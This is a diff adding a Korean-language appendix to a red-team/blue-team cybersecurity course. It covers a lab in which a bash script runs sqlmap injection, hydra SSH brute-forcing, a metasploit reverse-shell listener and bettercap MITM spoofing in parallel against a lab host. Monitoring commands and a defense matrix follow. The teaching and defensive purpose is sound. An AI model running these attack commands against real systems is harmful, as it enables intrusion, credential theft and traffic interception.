@@ -707,3 +707,106 @@ graph LR
 
 **학생 액션**: lab 5인 팀 공방전 → 5단계 모두 dataset 신호 매핑.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course11 — Week 13 다중 벡터 공격)
+
+### Red — 4 벡터 동시 공격
+
+| 벡터 | 도구 | Blue 방어 |
+|------|------|----------|
+| Web | sqlmap + XSStrike + dalfox | ModSec + Suricata |
+| 인증 | hydra (SSH/HTTP 동시) | fail2ban + Wazuh frequency |
+| 시스템 | metasploit + msfvenom | Falco + Wazuh agent |
+| 네트워크 | tcpdump + bettercap (MITM) | Suricata DPI + Zeek |
+
+### 동시 공격 시나리오 (Red — 4 터미널 병렬)
+
+```bash
+# === Terminal 1: Web ===
+sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=apple" \
+    --batch --random-agent --dbs &
+SQLMAP_PID=$!
+
+# === Terminal 2: SSH brute ===
+hydra -L /tmp/users.txt -P /usr/share/wordlists/rockyou.txt \
+    ssh://10.20.30.80 -t 4 &
+HYDRA_PID=$!
+
+# === Terminal 3: 시스템 (metasploit) ===
+msfconsole -q -x "
+use exploit/multi/handler;
+set payload linux/x64/shell_reverse_tcp;
+set LHOST 192.168.0.112;
+set LPORT 4444;
+exploit -j;
+" &
+MSF_PID=$!
+
+# === Terminal 4: 네트워크 MITM (실습 환경에서만!) ===
+sudo bettercap -iface eth0 -caplet /usr/share/bettercap/caplets/spoof.cap &
+BC_PID=$!
+
+# === 모니터 ===
+echo "All attacks running:"
+echo "  sqlmap PID=$SQLMAP_PID"
+echo "  hydra PID=$HYDRA_PID"
+echo "  msf PID=$MSF_PID"
+echo "  bettercap PID=$BC_PID"
+
+# 30분 후 종료
+sleep 1800
+kill $SQLMAP_PID $HYDRA_PID $MSF_PID $BC_PID
+```
+
+### Blue — 통합 모니터 (4 layer 방어)
+
+```bash
+# === 통합 모니터 dashboard (Wazuh + Suricata + Falco) ===
+watch -n 5 '
+echo "=== Wazuh (level >= 10, 5분 내) ==="
+sudo jq -r "select(.rule.level >= 10 and (now - (.timestamp | fromdateiso8601)) < 300) | \"[\\(.rule.level)] \\(.rule.description)\"" /var/ossec/logs/alerts/alerts.json | tail -10
+
+echo ""
+echo "=== Suricata (alert 5분 내) ==="
+sudo tail /var/log/suricata/eve.json | jq -r "select(.event_type == \"alert\") | \"[\\(.alert.severity)] \\(.alert.signature)\"" | tail -10
+
+echo ""
+echo "=== Falco (CRITICAL 5분 내) ==="
+sudo journalctl -u falco --since "5 minutes ago" --output cat | grep CRITICAL | tail -10
+
+echo ""
+echo "=== fail2ban 차단 IP ==="
+sudo fail2ban-client status sshd | grep "Banned IP"
+'
+
+# === 자동 대응 (Wazuh AR + Shuffle workflow) ===
+# 모든 alert level 13+ 가 자동으로:
+# 1. nft block (10.20.30.1)
+# 2. TheHive case 생성
+# 3. Slack 알림
+# 4. Velociraptor live hunt 트리거
+```
+
+### 4 vector × 5 layer defense matrix
+
+```
+Web Attack:
+  L3/4 (nft) → L7 (ModSec) → IDS (Suricata) → SIEM (Wazuh) → SOAR (Shuffle)
+                  ✓ 95%       ✓ 70%             ✓ 80%          ✓ 90%
+
+Auth Attack:
+  L3/4 (fail2ban) → SIEM (Wazuh frequency) → SOAR (block + alert)
+       ✓ 99%             ✓ 95%                    ✓ 90%
+
+System Attack:
+  Endpoint (Falco) → SIEM (Wazuh agent) → SOAR (auto isolate)
+       ✓ 70%            ✓ 80%                  ✓ 60%
+
+Network Attack:
+  IDS (Suricata) → DPI (Zeek) → SIEM 통합
+       ✓ 60%       ✓ 50%         ✓ 70%
+```
+
+학생은 본 13주차에서 4 벡터 동시 공격 ↔ 5 layer 방어를 OSS 도구로 익힌다 — Red 도구 (sqlmap + hydra + metasploit + bettercap) ↔ Blue (ModSec + fail2ban + Falco + Suricata + Wazuh + Shuffle).
